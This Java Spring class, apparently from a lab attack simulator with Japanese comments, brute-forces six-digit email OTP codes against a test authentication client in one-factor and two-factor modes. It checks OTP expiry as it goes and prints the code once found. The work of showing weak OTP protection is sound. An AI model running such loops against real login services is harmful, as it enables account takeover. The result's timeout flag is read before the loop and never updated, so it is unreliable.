
package com.example.attacksimulator.attack;

import org.springframework.stereotype.Component;

import com.example.attacksimulator.client.NewAuthLabLoginClient;
import com.example.attacksimulator.client.NewAuthLabLoginClient.LoginResult;
import com.example.attacksimulator.state.AttackState;

@Component
public class EmailOtpBruteForceAttack {

    private final NewAuthLabLoginClient newAuthLabLoginClient;

    private final AttackState attackState;

    public EmailOtpBruteForceAttack(
            NewAuthLabLoginClient newAuthLabLoginClient,
            AttackState attackState) {

        this.newAuthLabLoginClient = newAuthLabLoginClient;
        this.attackState = attackState;
    }

    // =========================================================
    // 一要素認証
    // Email OTP 総当たり攻撃
    // =========================================================

    /**
     * Email OTP 総当たり攻撃
     *
     * @param username 対象ユーザーのユーザー名
     * @param email 対象ユーザーのメールアドレス
     * @param maxAttempts 最大攻撃試行回数
     * @return 攻撃結果
     */
    public AttackResult execute(
            String username,
            String email,
            int maxAttempts) {

        if (username == null || username.isBlank()) {
            throw new IllegalArgumentException(
                    "ユーザー名が指定されていません。");
        }

        if (email == null || email.isBlank()) {
            throw new IllegalArgumentException(
                    "メールアドレスが指定されていません。");
        }

        if (maxAttempts <= 0) {
            throw new IllegalArgumentException(
                    "最大試行回数は1以上にしてください。");
        }

        // OTPは000000～999999の6桁
        int actualMaxAttempts =
                Math.min(maxAttempts, 1_000_000);
                
        boolean timeOut=attackState.isOtpTimedOut();

        // =====================================================
        // OTP発行
        // =====================================================

        LoginResult sendOtpResult =
                newAuthLabLoginClient.sendEmailOtp(
                        username,
                        email);

        if (!sendOtpResult.isRequestSuccess()) {

            return new AttackResult(
                    false,
                    null,
                    0,
                    null,
                    false);
        }

        // =====================================================
        // OTP総当たり
        // =====================================================

        int attemptCount = 0;

        attackState.setOtpTimedOut(false);

        // 最後に期限確認を行った時刻
        long lastExpirationCheck = 0;

        for (int i = 0; i < 1_000_000; i++) {

            // 停止ボタンなどによる割り込み確認
            if (Thread.currentThread().isInterrupted()) {
                break;
            }

            if (attemptCount >= actualMaxAttempts) {
                break;
            }

            // =================================================
            // OTP有効期限確認（約1秒間隔）
            // =================================================

            long now = System.nanoTime();

            if (lastExpirationCheck == 0
                    || now - lastExpirationCheck >= 1_000_000_000L) {

                lastExpirationCheck = now;

                boolean expired =
                        newAuthLabLoginClient.checkOtpExpiration();

                // 通信中断の確認
                if (Thread.currentThread().isInterrupted()) {
                    break;
                }

                // OTP期限切れ
                if (expired) {

                    attackState.setOtpTimedOut(true);

                    break;
                }
            }

            // =================================================
            // OTP候補作成
            // =================================================

            String candidate =
                    String.format("%06d", i);

            attemptCount++;

            System.out.println(
                    "Email OTP総当たり 試行 "
                            + attemptCount
                            + " / "
                            + actualMaxAttempts
                            + " : "
                            + candidate);

            // =================================================
            // OTP検証
            // =================================================

            LoginResult verifyResult =
                    newAuthLabLoginClient.verifyEmailOtp(candidate);

            // 通信中断の確認
            if (Thread.currentThread().isInterrupted()) {
                break;
            }

            // =================================================
            // 正解OTP発見
            // =================================================

            if (verifyResult.isSuccess()) {

                System.out.println("========================================");
                System.out.println("正解OTPを発見しました！");
                System.out.println("正解OTP = " + candidate);
                System.out.println("試行回数 = " + attemptCount);
                System.out.println("========================================");

                return new AttackResult(
                        true,
                        candidate,
                        attemptCount,
                        verifyResult,
                        timeOut);
            }
        }

        return new AttackResult(
                false,
                null,
                attemptCount,
                null,
                timeOut);
    }

    // =========================================================
    // 二要素認証
    // Password → Email OTP 総当たり攻撃
    // =========================================================

    public AttackResult executeTwoFactor(
            String username,
            String password,
            int maxAttempts) {

        if (username == null || username.isBlank()) {
            throw new IllegalArgumentException(
                    "ユーザー名が指定されていません。");
        }

        if (password == null || password.isBlank()) {
            throw new IllegalArgumentException(
                    "パスワードが指定されていません。");
        }

        if (maxAttempts <= 0) {
            throw new IllegalArgumentException(
                    "最大試行回数は1以上にしてください。");
        }

        int actualMaxAttempts =
                Math.min(maxAttempts, 1_000_000);

        // =====================================================
        // Password認証・OTP発行
        // =====================================================

        LoginResult passwordResult =
                newAuthLabLoginClient.loginTwoFactorPassword(
                        username,
                        password);

        if (!passwordResult.isRequestSuccess()) {

            System.out.println("Password認証に失敗しました。");

            return new AttackResult(
                    false,
                    null,
                    0,
                    passwordResult,
                    false);
        }

        // =====================================================
        // OTP総当たり
        // =====================================================

        int attemptCount = 0;

        attackState.setOtpTimedOut(false);

        long lastExpirationCheck = 0;
        
        boolean timeOut=attackState.isOtpTimedOut();

        for (int i = 0; i < 1_000_000; i++) {

            // 停止ボタンによる割り込み確認
            if (Thread.currentThread().isInterrupted()) {
                System.out.println("総当たり攻撃を停止しました。");
                break;
            }

            if (attemptCount >= actualMaxAttempts) {
                break;
            }

            // =================================================
            // OTP有効期限確認（約1秒間隔）
            // =================================================

            long now = System.nanoTime();

            if (lastExpirationCheck == 0
                    || now - lastExpirationCheck >= 1_000_000_000L) {

                lastExpirationCheck = now;

                boolean expired =
                        newAuthLabLoginClient.checkOtpExpiration();

                if (Thread.currentThread().isInterrupted()) {
                    break;
                }

                if (expired) {
                    attackState.setOtpTimedOut(true);
                    break;
                }
            }

            // =================================================
            // OTP候補作成
            // =================================================

            String candidate =
                    String.format("%06d", i);

            attemptCount++;

            // =================================================
            // OTP検証
            // =================================================

            LoginResult verifyResult =
                    newAuthLabLoginClient.verifyTwoFactorOtp(
                            candidate);

            if (Thread.currentThread().isInterrupted()) {
                break;
            }

            // =================================================
            // 正解OTP発見
            // =================================================

            if (verifyResult.isSuccess()) {

                System.out.println("========================================");
                System.out.println("正解OTPを発見しました！");
                System.out.println("正解OTP = " + candidate);
                System.out.println("試行回数 = " + attemptCount);
                System.out.println("総当たり攻撃を終了します。");
                System.out.println("========================================");

                return new AttackResult(
                        true,
                        candidate,
                        attemptCount,
                        verifyResult,
                        timeOut);
            }
        }

        return new AttackResult(
                false,
                null,
                attemptCount,
                null,
                timeOut);
    }

    // =========================================================
    // Email OTP総当たり攻撃結果
    // =========================================================

    public static class AttackResult {

        private final boolean success;

        private final String otp;

        private final int attemptCount;

        private final LoginResult loginResult;
        
        private final boolean timeOut;

        public AttackResult(
                boolean success,
                String otp,
                int attemptCount,
                LoginResult loginResult,
                boolean timeOut) {

            this.success = success;
            this.otp = otp;
            this.attemptCount = attemptCount;
            this.loginResult = loginResult;
            this.timeOut=timeOut;
        }



        public boolean isSuccess() {
            return success;
        }

        public String getOtp() {
            return otp;
        }

        public int getAttemptCount() {
            return attemptCount;
        }

        public LoginResult getLoginResult() {
            return loginResult;
        }
        public boolean isTimeOut() {
        	return timeOut;
        }
    }
}
